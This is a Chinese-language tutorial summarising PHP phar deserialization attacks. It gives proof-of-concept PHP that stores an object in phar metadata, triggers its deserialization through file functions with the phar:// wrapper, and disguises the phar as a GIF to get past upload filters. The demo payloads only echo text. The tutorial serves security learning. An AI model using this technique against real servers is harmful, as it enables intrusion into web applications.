[TOC]

## phar反序列化总结

### 前言

php中很多都是使用`unserialize()`进行反序列化，但是有些是不需要使用这个函数也能进行反序列化的。

我们可以使用`phar文件`结合`相关函数`进行反序列化，此处我们讲解phar反序列化。



### 概念

在讲解之前，我们需要知道什么是`phar`，Phar是将php文件打包成的一种压缩文档，类似java中的jar包。它的特性就是phar文件会以反序列化的形式存储用户自定义的`meta-data`。配合`phar://伪协议`使用。

（简单来说，phar文件就是php的压缩文件，并且可以不经过解压就被php文件访问执行）



### 前提条件

> ```
> php.ini中设置为phar.readonly=Off
> php version>=5.3.0
> ```



### phar组成结构



| 属性      | 解释                                                         |
| --------- | ------------------------------------------------------------ |
| stub      | 它是`phar`的文件标识，格式：`xxx<?php xxx; __HALT_COMPLILER();?>` |
| manifest  | 就是`meta-data`,存放压缩文件信息，以序列化方式存储           |
| contents  | 压缩文件的内容                                               |
| signature | 签名，放在文件末尾                                           |

这里需要注意：

> 1、文件标识：phar文件标识放在文件的头部，但是必须以 `__HALT_COMPILER();?>`结尾，前面没有限制，这就意味着我们可以将phar文件进行伪造，添加一些图片或其他文件的头标志信息来绕过一些限制。
>
> 2、反序列化，phar存储的`meta-data`信息以序列化方式存储，当某一些**特定的文件操作函数**，
>
> 使用`phar://伪协议`来解析phar文件时，会将数据反序列化。

这样的文件操作函数有很多：

![20191112145239-0436a1c4-0519-1](https://s2.loli.net/2023/03/23/JlVktEbKgiWGAeH.png)

这些函数配合`phar://伪协议`时，就会反序列化数据



### 生成phar文件

我们可以使用php提供的内置类`Phar`来生成phar文件

```php
<?php
    class TestObject {
    	public function __destruct() {
            echo "hacker";
        }
    }

    @unlink("phar.phar");  //先删除存在的phar.phar
    $phar = new Phar("phar.phar"); //后缀名必须为phar
    $phar->startBuffering();
    $phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
    $o = new TestObject();
    $phar->setMetadata($o); //将自定义的meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
?>
```

运行代码，就生成了一个phar文件：

![image-20230323144009160](https://s2.loli.net/2023/03/23/W9szSLkoGtvm2j5.png)

我们看到，`meta-data`中的数据确实是被序列化存储



### phar反序列化漏洞

有序列化的地方，就会存在反序列化。当`特定文件操作函数`通过`phar://伪协议`去解析phar文件时，就会将phar中数据反序列化



我们使用如下代码生成phar文件：

```php
<?php
    class TestObject {
       public function __destruct() {
            echo "hacker";
        }
    }

    @unlink("phar.phar");  //先删除存在的phar.phar
    $phar = new Phar("phar.phar"); //后缀名必须为phar
    $phar->startBuffering();
    $phar->setStub('<?php __HALT_COMPILER(); ?>'); //设置stub
    $o = new TestObject();
    $phar->setMetadata($o); //将自定义的meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
```

执行后，在当前目录生成了一个`phar.phar`文件

我们使用如下代码，证明反序列化（此处选取`file_exists()`函数）：

```php
<?php
     class TestObject {
       public function __destruct() {
            echo "nb plus!";
        }
    }
    $f = "phar://phar.phar";
    file_exists($f);

输出：
nb plus!
```

当文件系统函数的参数可控时，我们可以在不调用`unserialize()`的情况下进行反序列化操作,极大的拓展了攻击面，其它函数也是可以的，比如`is_dir`、`file_get_contents()`函数,代码如下:

```php
<?php
     class TestObject {
       public function __destruct() {
            echo "nb plus!";
        }
    }
    $f = "phar://phar.phar";
    is_dir($f);
```



### phar伪装成其他文件

有时我们可以结合文件上传和文件包含去执行反序列化漏洞，但是上传phar文件被过滤了，我们必须伪装成其他文件，例如gif、png等图片(检查文件类型)



在前面分析时，我们知道，php分析phar文件是根据`stub属性`，stub必须以`__HALT_COMPILER();?> `结尾。

对前面的内容、文件后缀是没有要求的，我们可以`添加文件头+修改文件后缀`伪装成其他文件

示范一下伪装成GIF：

```php
<?php
    class TestObject {
    }
    @unlink("phar.phar");  //先删除存在的phar.phar
    $phar = new Phar("phar.phar"); //后缀名必须为phar
    $phar->startBuffering();
    $phar->setStub("GIF89a".'<?php __HALT_COMPILER(); ?>'); //设置stub
    $o = new TestObject();
    $phar->setMetadata($o); //将自定义的meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
```

这样就伪装成GIF了

![image-20230323150245356](https://s2.loli.net/2023/03/23/OHBxsjf3ypkAie5.png)





### 利用条件

> phar文件需要上传到服务器端
> 要有可用的魔术方法作为“跳板”
> 文件操作函数的参数可控，且:  `/、phar`等特殊字符没有被过滤



### 参考

https://xz.aliyun.com/t/6753#toc-13

https://www.freebuf.com/articles/web/305292.html